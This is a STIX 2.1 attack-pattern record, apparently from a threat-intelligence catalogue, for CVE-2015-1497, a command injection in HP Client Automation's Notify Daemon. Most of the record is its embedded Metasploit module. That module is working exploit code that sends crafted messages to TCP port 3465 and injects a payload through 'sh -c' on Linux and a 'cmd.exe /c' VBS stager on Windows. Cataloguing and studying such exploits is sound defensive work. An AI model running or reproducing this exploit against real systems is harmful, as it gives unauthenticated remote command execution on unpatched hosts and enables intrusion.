{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d9e00e94-6ed2-4fce-b785-ad596687721f",
    "created": "2024-08-14T17:06:51.265665Z",
    "modified": "2024-08-14T17:06:51.26567Z",
    "name": "HP Client Automation Command Injection",
    "description": " This module exploits a command injection vulnerability on HP Client Automation, distributed actually as Persistent Systems Client Automation. The vulnerability exists in the Notify Daemon (radexecd.exe), which doesn't authenticate execution requests by default.  This module has been tested successfully on HP Client Automation 9.00 on Windows 2003 SP2 and CentOS 5. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/persistent_hpca_radexec_exec.rb",
            "external_id": "persistent_hpca_radexec_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-1497"
        },
        {
            "source_name": "reference",
            "url": "https://radiasupport.accelerite.com/hc/en-us/articles/203659814-Accelerite-releases-solutions-and-best-practices-to-enhance-the-security-for-RBAC-and-Remote-Notify-features"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP Client Automation Command Injection',\n      'Description'    => %q{\n        This module exploits a command injection vulnerability on HP Client Automation, distributed\n        actually as Persistent Systems Client Automation. The vulnerability exists in the Notify\n        Daemon (radexecd.exe), which doesn't authenticate execution requests by default.\n\n        This module has been tested successfully on HP Client Automation 9.00 on Windows 2003 SP2\n        and CentOS 5.\n      },\n      'Author'         =>\n        [\n          'Ben Turner', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2015-1497'],\n          ['ZDI', '15-038'],\n          ['URL', 'https://radiasupport.accelerite.com/hc/en-us/articles/203659814-Accelerite-releases-solutions-and-best-practices-to-enhance-the-security-for-RBAC-and-Remote-Notify-features']\n        ],\n      'Privileged'     => true,\n      'Platform'       => %w{ unix win },\n      'DefaultOptions' =>\n        {\n            'WfsDelay' => 10\n        },\n      'Payload'        => {'DisableNops' => true},\n      'Targets'        =>\n        [\n          [ 'HP Client Automation 9.0.0 / Linux',\n            {\n              'Platform' => 'unix',\n              'Arch'     => ARCH_CMD,\n              'Payload'  =>\n                {\n                  'Space'       => 466,\n                  'EncoderType' => Msf::Encoder::Type::CmdUnixPerl,\n                  'Compat'      =>\n                    {\n                      'PayloadType' => 'cmd',\n                      'RequiredCmd' => 'openssl telnet generic gawk'\n                    },\n                  'BadChars' => \"\\x27\"\n                }\n            }\n          ],\n          [ 'HP Client Automation 9.0.0 / Windows',\n            {\n              'Platform' => 'win',\n              'Arch'     => ARCH_X86\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-01-02'))\n\n    register_options(\n      [\n        Opt::RPORT(3465)\n      ])\n\n    deregister_options('CMDSTAGER::FLAVOR')\n    deregister_options('CMDSTAGER::DECODER')\n  end\n\n  def check\n    connect\n    sock.put(\"\\x00\") # port\n    sock.put(\"#{rand_text_alphanumeric(4 + rand(3))}\\x00\") # user ID\n    sock.put(\"#{rand_text_alpha(4 + rand(3))}\\x00\") # password\n    sock.put(\"hide\\x00\") # command\n    res = sock.get_once\n    disconnect\n\n    if res && res.unpack('C')[0] == 0\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    case target['Platform']\n    when 'win'\n      print_status('Exploiting Windows target...')\n      execute_cmdstager({:flavor => :vbs, :linemax => 290})\n    when 'unix'\n      print_status('Exploiting Linux target...')\n      exploit_unix\n    else\n      fail_with(Failure::NoTarget, 'Invalid target')\n    end\n  end\n\n  def exploit_unix\n    connect\n    sock.put(\"\\x00\") # port\n    sock.put(\"0\\x00\") # user ID\n    sock.put(\"#{rand_text_alpha(4 + rand(3))}\\x00\") # password\n    sock.put(\"hide hide\\x09sh -c '#{payload.encoded.gsub(/\\\\/, \"\\\\\\\\\\\\\\\\\")}'\\x00\") # command, here commands can be injected\n    disconnect\n  end\n\n  def execute_command(cmd, opts = {})\n    connect\n    sock.put(\"\\x00\") # port\n    sock.put(\"S-1-5-18\\x00\") # user ID\n    sock.put(\"#{rand_text_alpha(4 + rand(3))}\\x00\") # password\n    sock.put(\"hide hide\\\"\\x09\\\"cmd.exe /c #{cmd}&\\\"\\x00\") # command, here commands can be injected\n    res = sock.get_once\n    disconnect\n    unless res && res.unpack('C')[0] == 0\n      fail_with(Failure::Unknown, \"Something failed executing the stager...\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-01-02",
    "x_mitre_platforms": [
        "win'"
    ]
}